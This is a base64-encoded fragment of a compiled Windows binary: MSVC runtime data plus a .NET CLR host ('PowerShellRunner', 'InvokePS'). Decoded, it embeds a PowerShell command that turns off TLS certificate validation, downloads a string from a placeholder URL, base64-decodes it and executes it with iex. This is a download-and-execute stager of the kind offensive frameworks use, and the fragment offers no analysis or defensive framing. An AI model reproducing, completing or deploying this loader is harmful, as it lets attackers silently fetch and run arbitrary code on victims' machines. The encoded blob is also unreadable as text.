AgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIAB0AGgAZQAgAEMAUgBUACAAbQBvAHIAZQAgAHQAaABhAG4AIABvAG4AYwBlAC4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4ADQAKAAAAAABSADYAMAAzADAADQAKAC0AIABDAFIAVAAgAG4AbwB0ACAAaQBuAGkAdABpAGEAbABpAHoAZQBkAA0ACgAAAAAAAAAAAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMQA5AA0ACgAtACAAdQBuAGEAYgBsAGUAIAB0AG8AIABvAHAAZQBuACAAYwBvAG4AcwBvAGwAZQAgAGQAZQB2AGkAYwBlAA0ACgAAAAAAAAAAAAAAAAAAAAAAUgA2ADAAMQA4AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAGgAZQBhAHAAIABlAHIAcgBvAHIADQAKAAAAAA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AAAAAATm92ZW1iZXIAAAAAAAAAAE9jdG9iZXIAU2VwdGVtYmVyAAAAQXVndXN0AABKdWx5AAAAAEp1bmUAAAAAQXByaWwAAABNYXJjaAAAAAAAAABGZWJydWFyeQAAAAAAAAAASmFudWFyeQBEZWMATm92AE9jdABTZXAAQXVnAEp1bABKdW4ATWF5AEFwcgBNYXIARmViAEphbgBTYXR1cmRheQAAAABGcmlkYXkAAAAAAABUaHVyc2RheQAAAAAAAAAAV2VkbmVzZGF5AAAAAAAAAFR1ZXNkYXkATW9uZGF5AABTdW5kYXkAAFNhdABGcmkAVGh1AFdlZABUdWUATW9uAFN1bgAAAAAAKABuAHUAbABsACkAAAAAAChudWxsKQAABgAABgABAAAQAAMGAAYCEARFRUUFBQUFBTUwAFAAAAAAKCA4UFgHCAA3MDBXUAcAACAgCAAAAAAIYGhgYGBgAAB4cHh4eHgIBwgAAAcACAgIAAAIAAgABwgAAAAAAAAAIENvbXBsZXRlIE9iamVjdCBMb2NhdG9yJwAAAAAAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBCYXNlIENsYXNzIEFycmF5JwAAAAAAACBCYXNlIENsYXNzIERlc2NyaXB0b3IgYXQgKAAAAAAAIFR5cGUgRGVzY3JpcHRvcicAAAAAAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAAAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAAAAAAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAAAAAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAAAAAAGBvbW5pIGNhbGxzaWcnAAAgZGVsZXRlW10AAAAgbmV3W10AAAAAAABgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAYGxvY2FsIHZmdGFibGUnAGBSVFRJAAAAYEVIAAAAAABgdWR0IHJldHVybmluZycAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAAAAAABgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAAAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAAAAAAGBzdHJpbmcnAAAAAAAAAABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgdHlwZW9mJwAAAAAAAAAAYHZjYWxsJwBgdmJ0YWJsZScAAAAAAAAAYHZmdGFibGUnAAAAXj0AAHw9AAAmPQAAPDw9AD4+PQAlPQAALz0AAC09AAArPQAAKj0AAHx8AAAmJgAAfAAAAF4AAAB+AAAAKCkAACwAAAA+PQAAPgAAADw9AAA8AAAAJQAAAC8AAAAtPioAJgAAACsAAAAtAAAALS0AACsrAAAqAAAALT4AAG9wZXJhdG9yAAAAAFtdAAAhPQAAPT0AACEAAAA8PAAAPj4AAD0AAAAgZGVsZXRlACBuZX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B0ACAAQQBwAHAARABvAG0AYQBpAG4AIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAbABvAGEAZAAgAHQAaABlACAAYQBzAHMAZQBtAGIAbAB5ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AGgAZQAgAFQAeQBwAGUAIABpAG4AdABlAHIAZgBhAGMAZQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwBpAGUAeAAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAIgApACkAKQApAAAASQBuAHYAbwBrAGUAUABTAAAAAAAAAAAAAAAAAAAAAABTAGEAZgBlAEEAcgByAGEAeQBQAHUAdABFAGwAZQBtAGUAbgB0ACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAAAAAABGAGEAaQBsAGUAZA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